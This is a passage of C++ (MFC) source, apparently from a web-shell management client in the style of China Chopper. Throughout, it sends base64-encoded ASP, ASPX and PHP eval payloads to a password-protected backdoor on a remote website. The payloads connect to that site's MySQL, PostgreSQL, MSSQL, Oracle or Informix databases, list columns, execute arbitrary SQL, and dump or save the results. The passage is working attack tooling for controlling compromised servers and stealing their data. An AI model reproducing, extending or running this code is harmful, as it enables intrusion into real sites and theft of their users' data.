			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ szDataColumnsPhpMssql + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+ pDlg->GetColumns_szDataName +"&z5="+ pDlg->GetColumns_szTableName, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "ODBC_MSSQL")
		{
			pDlg->SetDlgItemText(IDC_COMBO_SQL,"Select Top 20 * From "+pDlg->GetColumns_szTableName+" Order By 1");
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ szDataColumnsPhpODBC_MSSQL + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+ pDlg->GetColumns_szDataName +"&z5="+ pDlg->GetColumns_szTableName, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "MYSQL")
		{
			pDlg->SetDlgItemText(IDC_COMBO_SQL,"Select * From `"+pDlg->GetColumns_szTableName+"` Order By 1 DESC Limit 0,20");
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ szDataColumnsPhpMysql + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+ pDlg->GetColumns_szDataName +"&z5="+ pDlg->GetColumns_szTableName, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "PDO_MYSQL")
		{
			pDlg->SetDlgItemText(IDC_COMBO_SQL,"Select * From `"+pDlg->GetColumns_szTableName+"` Order By 1 DESC Limit 0,20");
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ szDataColumnsPhpPDO_MYSQL + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+ pDlg->GetColumns_szDataName +"&z5="+ pDlg->GetColumns_szTableName, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "PDO_MSSQL")
		{
			pDlg->SetDlgItemText(IDC_COMBO_SQL,"Select Top 20 * From "+pDlg->GetColumns_szTableName+" Order By 1");
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ szDataColumnsPhpPDO_MSSQL + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+ pDlg->GetColumns_szDataName +"&z5="+ pDlg->GetColumns_szTableName, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "POSTGRESQL")
		{
			pDlg->SetDlgItemText(IDC_COMBO_SQL,"Select * From \""+pDlg->GetColumns_szTableName+"\" Order By 1 DESC Limit 20 offset 0");
			CString szDataPort,szDataNameD;
			posX = pDlg->szSiteConfig.Find("<S>");
			posY = pDlg->szSiteConfig.Find("</S>", posX+1);
			szDataPort = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);

			posX = pDlg->szSiteConfig.Find("<D>");
			posY = pDlg->szSiteConfig.Find("</D>", posX+1);
			szDataNameD = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
			szDataNameD = UrlEnCode(pDlg->nSiteCode, szDataNameD);

			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataColumnsPhpPostgreSQL +szDataHost+"&z2="+szDataPort+"&z3="+szDataNameD+"&z4="+szDataUser+"&z5="+szDataPass+"&z6="+pDlg->GetColumns_szDataName+"&z7="+pDlg->GetColumns_szTableName, pDlg->nSiteCode, temp, szError);
		}else{
			AfxMessageBox("Type of database does not recognize.");
			pDlg->bThreadFinish = true;
			return 0;
		}
		//AfxMessageBox("PHP: "+ pDlg->szSiteConfig );
	}else if (pDlg->nSiteScript ==4)																		//JSP
	{
		posX = pDlg->szSiteConfig.Find("<X>");
		if (posX == -1)
		{
			pDlg->bThreadFinish = true;
			return 0;
		}
		posY = pDlg->szSiteConfig.Find("</X>", posX+1);
		if (posY == -1)
		{
			pDlg->bThreadFinish = true;
			return 0;
		}

		CString szDataType = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		szDataType.MakeUpper();								//转大写比较
		if (szDataType.Find("MYSQL") != -1)
		{
			pDlg->SetDlgItemText(IDC_COMBO_SQL,"Select * From "+pDlg->GetColumns_szTableName+" Order By 1 Limit 0,20");
		}else if (szDataType.Find("ORACLE") != -1)
		{
			pDlg->SetDlgItemText(IDC_COMBO_SQL,"Select * From "+pDlg->GetColumns_szTableName+" Where RowNum <= 20 Order By 1");
		}else if (szDataType.Find("MICROSOFT") != -1)
		{
			pDlg->SetDlgItemText(IDC_COMBO_SQL,"Select Top 20 * From "+pDlg->GetColumns_szTableName+" Order By 1");
		}

		szDataType = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		szDataType = UrlEnCode(pDlg->nSiteCode,  szDataType + pDlg->GetColumns_szDataName +"\r\n"+ pDlg->GetColumns_szTableName );
		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ "=P&z0="+ pDlg->szSiteCode +"&z1="+ szDataType, pDlg->nSiteCode, temp, szError);
		//AfxMessageBox("JSP: "+ pDlg->szSiteConfig );
	}else{
		AfxMessageBox("Type of SiteScript does not recognize.");
		pDlg->bThreadFinish = true;
		return 0;
	}

	if (pDlg->m_hWnd == NULL)		//正在执行，如果关闭就崩溃了。
	{
		return 0;
	}
	if (!bHttpIsOK)
	{
		AfxMessageBox( szError );
		pDlg->bThreadFinish = true;
		return 0;
	}
	if (temp == "")
	{
		pDlg->bThreadFinish = true;
		return 0;
	}
	if (temp.Left(8) == "ERROR://")
	{
		AfxMessageBox(temp);
		pDlg->bThreadFinish = true;
		return 0;
	}

	CStringArray szAColumns;
	szAColumns.RemoveAll();
	decodeCString(temp, szAColumns, '\t');

	bDeleteItems(pDlg->m_datatree, pDlg->GetColumns_hParent);			//清空所有

	int nIndex=(int)szAColumns.GetCount();
	int i=0;

	while(i < nIndex)
	{
		pDlg->m_datatree.InsertItem(szAColumns.GetAt(i), 2, 2, pDlg->GetColumns_hParent);
		if (i == 0)											//展开一次就好
		{
			pDlg->m_datatree.Expand(pDlg->GetColumns_hParent, TVE_EXPAND);
		}
		i++;
	}
	CString sz_edit;
	sz_edit.Format("Columns: %s(%d)", pDlg->GetColumns_szTableName, nIndex);
	m_edit.SetWindowText( sz_edit );					//设置状态栏

	pDlg->bThreadFinish = true;
	return 0;
}
DWORD WINAPI GetExecSql(LPVOID lpParam)		//线程//					执行SQL命令
{
	CDataDlg* pDlg = (CDataDlg*)lpParam;

	CString temp ="";

	if (pDlg->GetExecSql_szSql == "")
	{
		pDlg->GetDlgItem(IDC_COMBO_SQL)->SetFocus();
		pDlg->bThreadFinish = true;
		return 0;
	}

	if (pDlg->m_com_sql.FindStringExact(-1, pDlg->GetExecSql_szSql) == CB_ERR)		//没有记录，插入
	{
		pDlg->m_com_sql.InsertString(0, pDlg->GetExecSql_szSql);
	}
/*
	if (pDlg->m_comDatas.GetCurSel() == -1)			//请选择一个数据库
	{
		AfxMessageBox("Please select a database!");
		pDlg->GetDlgItem(IDC_COMBO_SQL)->SetFocus();
		pDlg->bThreadFinish = true;
		return 0;
	}
	pDlg->m_comDatas.GetLBText(pDlg->m_comDatas.GetCurSel(), szSelectData);		//获取现在选择的数据库
*/
	CString	szSelectData="";	//选择的数据库
	pDlg->m_comDatas.GetWindowText(szSelectData);		//直接获取内容
	szSelectData.TrimLeft();
	szSelectData.TrimRight();
	if (szSelectData == "")
	{
		AfxMessageBox("Please select a database!");
		pDlg->GetDlgItem(IDC_COMBO_SQL)->SetFocus();
		pDlg->bThreadFinish = true;
		return 0;
	}

	//////////////////////////////////////////////////////////////////////////			//导出文件，和分割符号
	CString szExportFile="";
	int posS1 = pDlg->GetExecSql_szSql.Find("--file:");
	if (posS1 != -1)
	{
		szExportFile = pDlg->GetExecSql_szSql.Mid(posS1+7, pDlg->GetExecSql_szSql.GetLength()-posS1-7);
		szExportFile.TrimLeft();
		szExportFile.TrimRight();
		pDlg->GetExecSql_szSql = pDlg->GetExecSql_szSql.Left(posS1);
		m_edit.SetWindowText( pDlg->GetExecSql_szSql +" file: "+ szExportFile );//设置状态栏
	}
	//////////////////////////////////////////////////////////////////////////
	//////////////////////////////////////////////////////////////////////////						//数据库远程备份，和分割符号
	CString szDataBakFile="";
	CString szDataBaksplit="";
	int posDataBak1 = pDlg->GetExecSql_szSql.Find("--save:");
	int posDataBak2 = pDlg->GetExecSql_szSql.Find("--split:");
	if (posDataBak1 != -1 && posDataBak2 != -1)
	{
		szDataBakFile = pDlg->GetExecSql_szSql.Mid(posDataBak1+7, posDataBak2-posDataBak1-7);
		szDataBaksplit = pDlg->GetExecSql_szSql.Right(pDlg->GetExecSql_szSql.GetLength()-posDataBak2-8);

		szDataBakFile.TrimLeft();
		szDataBakFile.TrimRight();
		szDataBaksplit.TrimLeft();
		szDataBaksplit.TrimRight();

		pDlg->GetExecSql_szSql = pDlg->GetExecSql_szSql.Left(posDataBak1);
		m_edit.SetWindowText( pDlg->GetExecSql_szSql +" save: "+ szDataBakFile );//设置状态栏
	}
	//////////////////////////////////////////////////////////////////////////
	temp = "";
	int posX=0,posY=0;
	CString szDataType;
	CString szDataHost,szDataUser,szDataPass;
	if (pDlg->nSiteScript == 1)																		// ASP
	{
		posX = pDlg->szSiteConfig.Find("<C>");
		posY = pDlg->szSiteConfig.Find("</C>", posX+1);
		szDataType = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		temp = szDataType;
		temp.MakeUpper();		//转大写比较
		if (temp.Find("DRIVER={SQL") != -1)
		{
			szDataType = UrlEnCode(pDlg->nSiteCode, szDataType, false, true);
			pDlg->GetExecSql_szSql = UrlEnCode(pDlg->nSiteCode, pDlg->GetExecSql_szSql, false, true);
			temp = "Set Conn=Server.CreateObject(\"Adodb.connection\"):Conn.Open \"\"&bd(Request(\"z1\"))&\"\":Dim CO,HD"
				",RN:CO=chr(9)&chr(124)&chr(9):RN=chr(13)&chr(10):HD=\"Result\"&CO&RN:If Err Then:Response.Write HD&E"
				"rr.Description&CO&RN:Err.Clear:Else:Conn.Execute(\"USE ["+ szSelectData +"]\"):Set Rs=Conn.Execute(\"\"&bd(Request"
				"(\"z2\"))&\"\"):If Err Then:Response.Write HD&Err.Number&\":\"&Err.Description&CO&RN:Err.Clear:Else:"
				"Dim FN:FN=Rs.Fields.Count-1:For n=0 To FN:Response.Write Rs.Fields.Item(n).Name&CO:Next:Response.Wri"
				"te RN:Do While Not(Rs.Eof Or Rs.Bof):For n=0 To FN:Response.Write Rs(n):Response.Write CO:Next:Respo"
				"nse.Write RN:Rs.MoveNext:Loop:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:";
			temp = UrlEnCode(pDlg->nSiteCode, temp, false, true);

			szDataType = szDataExecAspSqlServer + szDataType +"&z2="+ pDlg->GetExecSql_szSql;
			szDataType.Replace("%szDataExecAspSqlServer%", temp);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szDataType, pDlg->nSiteCode, temp, szError);
		}
		else if (temp.Find("PROVIDER=SQLOLEDB") != -1 ||
			temp.Find("DRIVER={MYSQL}") != -1 ||
			temp.Find("PROVIDER=ORAOLEDB") != -1 ||
			temp.Find("PROVIDER=MSDAORA") != -1 ||
			temp.Find("DSN=") != -1 )
		{
			szDataType = UrlEnCode(pDlg->nSiteCode, szDataType, false, true);
			pDlg->GetExecSql_szSql = UrlEnCode(pDlg->nSiteCode, pDlg->GetExecSql_szSql, false, true);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataExecAsp1 + szDataType +"&z2="+ pDlg->GetExecSql_szSql, pDlg->nSiteCode, temp, szError);
		}
		else if (temp.Find("DRIVER={MICROSOFT") != -1 ||
			temp.Find("PROVIDER=MICROSOFT") != -1)
		{
			szDataType = UrlEnCode(pDlg->nSiteCode, szDataType, false, true);
			pDlg->GetExecSql_szSql = UrlEnCode(pDlg->nSiteCode, pDlg->GetExecSql_szSql, false, true);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataExecAsp2 + szDataType +"&z2="+ pDlg->GetExecSql_szSql, pDlg->nSiteCode, temp, szError);
		}
		else{
			AfxMessageBox("Type of database does not recognize.");
			pDlg->bThreadFinish = true;
			return 0;
		}
	}else if (pDlg->nSiteScript ==2)																		//ASPX
	{
		posX = pDlg->szSiteConfig.Find("<C>");
		posY = pDlg->szSiteConfig.Find("</C>", posX+1);
		szDataType = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		temp = szDataType;
		temp.MakeUpper();		//转大写比较

		CString szDataFamatPageCode;
		szDataFamatPageCode.Format("%d", pDlg->nSiteCode);

		if (temp.Find("DRIVER={SQL") != -1)
		{
			temp = "var Conn=new ActiveXObject(\"Adodb.connection\");var strSQL:String=System.Text.Encoding.GetEncoding("
				"%nPageCode%).GetString(System.Convert.FromBase64String(Request.Item[\"z2\"]));Conn.ConnectionString=System"
				".Text.Encoding.GetEncoding(%nPageCode%).GetString(System.Convert.FromBase64String(Request.Item[\"z1\"]));C"
				"onn.ConnectionTimeout=10;Conn.Open();var CO:String=\"\\t|\\t\",RN:String=\"\\r\\n\",Dat:String;Conn.Defa"
				"ultDatabase=\""+ szSelectData +"\";var Rs=Conn.Execute(strSQL);var i:Int32=Rs.Fields.Count,c:Int32;for(c=0;c<i;c++"
				"){Response.Write(Rs.Fields(c).Name+CO);}Response.Write(RN);while(!Rs.EOF && !Rs.BOF){for(c=0;c<i;c++"
				"){Dat=Rs.Fields(c).Value;Response.Write(Dat);Response.Write(CO);}Response.Write(RN);Rs.MoveNext();}Conn.Close();";
			temp.Replace("%nPageCode%", szDataFamatPageCode);
			temp = MyBase64Encode(-1, temp);

			szDataType = MyBase64Encode(pDlg->nSiteCode, szDataType);
			szDataType = szDataExecAspxSqlServer + szDataType;
			szDataType.Replace("%szBase64EvalCode%", temp);
			szDataType.Replace("%nPageCode%", szDataFamatPageCode);

			pDlg->GetExecSql_szSql = MyBase64Encode(pDlg->nSiteCode, pDlg->GetExecSql_szSql);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ szDataType +"&z2="+ pDlg->GetExecSql_szSql, pDlg->nSiteCode, temp, szError);
		}
		else if (temp.Find("PROVIDER=SQLOLEDB") != -1 ||
			temp.Find("DRIVER={MYSQL}") != -1 ||
			temp.Find("PROVIDER=ORAOLEDB") != -1 ||
			temp.Find("PROVIDER=MSDAORA") != -1 ||
			temp.Find("DSN=") != -1 )
		{
			temp = MyBase64Encode(pDlg->nSiteCode, szDataType);
			temp = szDataExecAspx1 + temp;
			temp.Replace("%nPageCode%", szDataFamatPageCode);

			CString szBase64EvalCode = "var Conn=new ActiveXObject(\"Adodb.connection\");var strSQL:String=System.Text.Encoding.GetEncoding("+ szDataFamatPageCode +").Ge"
				"tString(System.Convert.FromBase64String(Request.Item[\"z2\"]));Conn.ConnectionString=System.Text.Encoding.Get"
				"Encoding("+ szDataFamatPageCode +").GetString(System.Convert.FromBase64String(Request.Item[\"z1\"]));Conn.ConnectionTimeout=10;Con"
				"n.Open();var CO:String=\"\\t|\\t\",RN:String=\"\\r\\n\",Dat:String;var Rs=Conn.Execute(strSQL);var i:Int32=Rs.F"
				"ields.Count,c:Int32;for(c=0;c<i;c++){Response.Write(Rs.Fields(c).Name+CO);}Response.Write(RN);while(!Rs.EOF && !Rs.B"
				"OF){for(c=0;c<i;c++){Dat=Rs.Fields(c).Value;Response.Write(Dat);Response.Write(CO);}Response.Write(RN);Rs.MoveNext();}Conn.Close();";
			szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
			temp.Replace("%szBase64EvalCode%", szBase64EvalCode);

			pDlg->GetExecSql_szSql = MyBase64Encode(pDlg->nSiteCode, pDlg->GetExecSql_szSql);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ temp +"&z2="+ pDlg->GetExecSql_szSql, pDlg->nSiteCode, temp, szError);
		}
		else if (temp.Find("DRIVER={MICROSOFT") != -1 ||
			temp.Find("PROVIDER=MICROSOFT") != -1)
		{
			temp = MyBase64Encode(pDlg->nSiteCode, szDataType);
			temp = szDataExecAspx2 + temp;
			temp.Replace("%nPageCode%", szDataFamatPageCode);

			CString szBase64EvalCode = "var Conn=new ActiveXObject(\"Adodb.connection\");var strSQL:String=System.Text.Encoding.GetEncoding("+ szDataFamatPageCode +").GetS"
				"tring(System.Convert.FromBase64String(Request.Item[\"z2\"]));Conn.ConnectionString=System.Text.Encoding.GetEn"
				"coding("+ szDataFamatPageCode +").GetString(System.Convert.FromBase64String(Request.Item[\"z1\"]));Conn.ConnectionTimeout=10;Conn.O"
				"pen();var CO:String=\"\\t|\\t\",RN:String=\"\\r\\n\",Dat:String;var Rs=Conn.Execute(strSQL);var i:Int32=Rs.Fields.C"
				"ount,c:Int32;for(c=0;c<i;c++){Response.Write(Rs.Fields(c).Name+CO);}Response.Write(RN);while(!Rs.EOF && !Rs.B"
				"OF){for(c=0;c<i;c++){Dat=Rs.Fields(c).Value;Response.Write(Dat);Response.Write(CO);}Response.Write(RN);Rs.MoveNext();}Conn.Close();";
			szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
			temp.Replace("%szBase64EvalCode%", szBase64EvalCode);

			pDlg->GetExecSql_szSql = MyBase64Encode(pDlg->nSiteCode, pDlg->GetExecSql_szSql);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ temp +"&z2="+ pDlg->GetExecSql_szSql, pDlg->nSiteCode, temp, szError);
		}
		else{
			AfxMessageBox("Type of database does not recognize.");
			pDlg->bThreadFinish = true;
			return 0;
		}
	}else if (pDlg->nSiteScript == 3)																		//PHP
	{
		posX = pDlg->szSiteConfig.Find("<T>");
		posY = pDlg->szSiteConfig.Find("</T>", posX+1);
		szDataType = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);

		posX = pDlg->szSiteConfig.Find("<H>");
		posY = pDlg->szSiteConfig.Find("</H>", posX+1);
		szDataHost = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		szDataHost = UrlEnCode(pDlg->nSiteCode, szDataHost);

		posX = pDlg->szSiteConfig.Find("<U>");
		posY = pDlg->szSiteConfig.Find("</U>", posX+1);
		szDataUser = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		szDataUser = UrlEnCode(pDlg->nSiteCode, szDataUser);

		posX = pDlg->szSiteConfig.Find("<P>");
		posY = pDlg->szSiteConfig.Find("</P>", posX+1);
		szDataPass = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		szDataPass = UrlEnCode(pDlg->nSiteCode, szDataPass);

		szDataType.MakeUpper();								//转大写比较
		if (szDataType == "INFORMIX")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ szDataExecPhpInformix + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+ szSelectData +"&z5="+ MyBase64Encode(pDlg->nSiteCode, pDlg->GetExecSql_szSql) +"&z6="+ szDataBakFile +"&z7="+ szDataBaksplit, pDlg->nSiteCode, temp, szError);

		}else if (szDataType == "ORACLE")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ szDataExecPhpOracle + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+ szSelectData +"&z5="+ MyBase64Encode(pDlg->nSiteCode, pDlg->GetExecSql_szSql) +"&z6="+ szDataBakFile +"&z7="+ szDataBaksplit, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "MSSQL")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ szDataExecPhpMssql + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+ szSelectData +"&z5="+ MyBase64Encode(pDlg->nSiteCode, pDlg->GetExecSql_szSql) +"&z6="+ szDataBakFile +"&z7="+ szDataBaksplit, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "PDO_MYSQL")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ szDataExecPhpPDO_MYSQL + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+ szSelectData +"&z5="+ MyBase64Encode(pDlg->nSiteCode, pDlg->GetExecSql_szSql) +"&z6="+ szDataBakFile +"&z7="+ szDataBaksplit, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "PDO_MSSQL")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ szDataExecPhpPDO_MSSQL + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+ szSelectData +"&z5="+ MyBase64Encode(pDlg->nSiteCode, pDlg->GetExecSql_szSql) +"&z6="+ szDataBakFile +"&z7="+ szDataBaksplit, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "ODBC_MSSQL")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ szDataExecPhpODBC_MSSQL + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+ szSelectData +"&z5="+ MyBase64Encode(pDlg->nSiteCode, pDlg->GetExecSql_szSql) +"&z6="+ szDataBakFile +"&z7="+ szDataBaksplit, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "MYSQL")
		{
			posX = pDlg->szSiteConfig.Find("<L>");
			posY = pDlg->szSiteConfig.Find("</L>", posX+1);
			CString szDataCode = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
			temp = pDlg->GetExecSql_szSql;
			temp.TrimLeft();
			temp.TrimRight();
			temp.MakeUpper();		//转大写比较
			if (temp.Left(6) == "SELECT" || temp.Left(4) == "SHOW")	//判断是SELECT，还是其他的
			{
				if (posDataBak1 != -1 && posDataBak2 != -1)						//数据库远程备份
				{
					temp = Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");"
						"$m=get_magic_quotes_gpc();"
						"$hst=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];"
						"$usr=$m?stripslashes($_POST[\"z2\"]):$_POST[\"z2\"];"
						"$pwd=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];"
						"$dbn=$m?stripslashes($_POST[\"z4\"]):$_POST[\"z4\"];"
						"$sql=base64_decode($_POST[\"z5\"]);"
						"$fle=$m?stripslashes($_POST[\"z6\"]):$_POST[\"z6\"];"
						"$spl=$m?stripslashes($_POST[\"z7\"]):$_POST[\"z7\"];"
						"$spl=empty($spl)?\"\\t|\\t\":$spl;"
						"$F=@fopen($fle,\"w\");"
						"$T=@mysql_connect($hst,$usr,$pwd);"
						"@mysql_query(\"SET NAMES "+ szDataCode +"\");"
						"@mysql_select_db($dbn);"
						"$q=@mysql_query($sql);"
						"$i=0;"
						"while($col=@mysql_field_name($q,$i)){if($F)fwrite($F,$col.$spl);$i++;}"
						"if($F)fwrite($F,\"\\r\\n\");"
						"while($rs=@mysql_fetch_row($q)){for($c=0;$c<$i;$c++){if($F)fwrite($F,trim($rs[$c]).$spl);}if($F)fwrite($F,\"\\r\\n\");}"
						"@mysql_close($T);"
						"@fclose($F);"
						"exit(\"1|<-\");";
				}else{
					temp = Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");"
						"$m=get_magic_quotes_gpc();"
						"$hst=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];"
						"$usr=$m?stripslashes($_POST[\"z2\"]):$_POST[\"z2\"];"
						"$pwd=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];"
						"$dbn=$m?stripslashes($_POST[\"z4\"]):$_POST[\"z4\"];"
						"$sql=base64_decode($_POST[\"z5\"]);"
						"$T=@mysql_connect($hst,$usr,$pwd);"
						"@mysql_query(\"SET NAMES "+ szDataCode +"\");"
						"@mysql_select_db($dbn);"
						"$q=@mysql_query($sql);"
						"$i=0;"
						"while($col=@mysql_field_name($q,$i)){echo($col.\"\\t|\\t\");$i++;}"
						"echo(\"\\r\\n\");"
						"while($rs=@mysql_fetch_row($q)){for($c=0;$c<$i;$c++){echo(trim($rs[$c]));echo(\"\\t|\\t\");}echo(\"\\r\\n\");}"
						"@mysql_close($T);"
						"exit(\"|<-\");";
				}
				temp = MyBase64Encode(-1, temp);
				temp = szDataExecPhpMysql + temp + "&z1=";
			}else{
				temp = Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");"
					"$m=get_magic_quotes_gpc();"
					"$hst=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];"
					"$usr=$m?stripslashes($_POST[\"z2\"]):$_POST[\"z2\"];"
					"$pwd=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];"
					"$dbn=$m?stripslashes($_POST[\"z4\"]):$_POST[\"z4\"];"
					"$sql=base64_decode($_POST[\"z5\"]);"
					"$T=@mysql_connect($hst,$usr,$pwd);"
					"@mysql_query(\"SET NAMES "+ szDataCode +"\");"
					"@mysql_select_db($dbn);"
					"$q=@mysql_query($sql);"
					"echo(\"Result\\t|\\t\\r\\n\");"
					"echo($q?\"Execute Successfully!\":mysql_error());"
					"echo(\"\\t|\\t\\r\\n\");"
					"@mysql_close($T);"
					"exit(\"|<-\");";
				temp = MyBase64Encode(-1, temp);
				temp = szDataExecPhpMysql + temp + "&z1=";
			}
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ temp + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+ szSelectData +"&z5="+ MyBase64Encode(pDlg->nSiteCode, pDlg->GetExecSql_szSql) +"&z6="+ szDataBakFile +"&z7="+ szDataBaksplit, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "POSTGRESQL")
		{
			CString szDataPort,szDataNameD;
			posX = pDlg->szSiteConfig.Find("<S>");
			posY = pDlg->szSiteConfig.Find("</S>", posX+1);
			szDataPort = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);

			posX = pDlg->szSiteConfig.Find("<D>");
			posY = pDlg->szSiteConfig.Find("</D>", posX+1);
			szDataNameD = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
			szDataNameD = UrlEnCode(pDlg->nSiteCode, szDataNameD);

			if (posDataBak1 != -1 && posDataBak2 != -1)						//数据库远程备份
			{
				temp = Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");"
					"$m=get_magic_quotes_gpc();"
					"$h=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];"
					"$s=$m?stripslashes($_POST[\"z2\"]):$_POST[\"z2\"];"
					"$d=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];"
					"$u=$m?stripslashes($_POST[\"z4\"]):$_POST[\"z4\"];"
					"$p=$m?stripslashes($_POST[\"z5\"]):$_POST[\"z5\"];"
					"$b=$m?stripslashes($_POST[\"z6\"]):$_POST[\"z6\"];"
					"$o=base64_decode($_POST[\"z7\"]);"
					"$fle=$m?stripslashes($_POST[\"z8\"]):$_POST[\"z8\"];"
					"$spl=$m?stripslashes($_POST[\"z9\"]):$_POST[\"z9\"];"
					"$spl=empty($spl)?\"\\t|\\t\":$spl;"
					"$F=@fopen($fle,\"w\");"
					"$l=@pg_connect(\"host=$h port=$s dbname=$d user=$u password=$p\");"
					"@pg_query($l,\"set client_encoding to '"+ pDlg->szSiteCode +"';SET search_path TO \\\"$b\\\";\");"
					"$q=@pg_query($l,\"$o;\") or die('ERROR://'.pg_last_error($l).'|<-');"
					"$i=0;"
					"while($col=@pg_field_name($q,$i)){if($F)fwrite($F,$col.$spl);$i++;}"
					"if($F)fwrite($F,\"\\r\\n\");"
					"while($rs=@pg_fetch_row($q)){for($c=0;$c<$i;$c++){if($F)fwrite($F,trim($rs[$c]).$spl);}if($F)fwrite($F,\"\\r\\n\");}"
					"@pg_close($l);"
					"@fclose($F);"
					"exit(\"1|<-\");";
			}else{
				temp = Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");"
					"$m=get_magic_quotes_gpc();"
					"$h=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];"
					"$s=$m?stripslashes($_POST[\"z2\"]):$_POST[\"z2\"];"
					"$d=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];"
					"$u=$m?stripslashes($_POST[\"z4\"]):$_POST[\"z4\"];"
					"$p=$m?stripslashes($_POST[\"z5\"]):$_POST[\"z5\"];"
					"$b=$m?stripslashes($_POST[\"z6\"]):$_POST[\"z6\"];"
					"$o=base64_decode($_POST[\"z7\"]);"
					"$l=@pg_connect(\"host=$h port=$s dbname=$d user=$u password=$p\");"
					"@pg_query($l,\"set client_encoding to '"+ pDlg->szSiteCode +"';SET search_path TO \\\"$b\\\";\");"
					"$q=@pg_query($l,\"$o;\") or die('ERROR://'.pg_last_error($l).'|<-');"
					"$i=0;"
					"while($col=@pg_field_name($q,$i)){echo($col.\"\\t|\\t\");$i++;}"
					"echo(\"\\r\\n\");"
					"while($rs=@pg_fetch_row($q)){for($c=0;$c<$i;$c++){echo(trim($rs[$c]));echo(\"\\t|\\t\");}echo(\"\\r\\n\");}"
					"@pg_close($l);"
					"exit(\"|<-\");";
			}
			temp = MyBase64Encode(-1, temp);
			temp = szDataExecPhpPostgreSQL + temp + "&z1=";

			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + temp + szDataHost+"&z2="+szDataPort+"&z3="+szDataNameD+"&z4="+szDataUser+"&z5="+szDataPass+"&z6="+szSelectData+"&z7="+MyBase64Encode(pDlg->nSiteCode, pDlg->GetExecSql_szSql) +"&z8="+ szDataBakFile +"&z9="+ szDataBaksplit, pDlg->nSiteCode, temp, szError);
		}else{
			AfxMessageBox("Type of database does not recognize.");
			pDlg->bThreadFinish = true;
			return 0;
		}
		//AfxMessageBox("PHP: "+ pDlg->szSiteConfig );
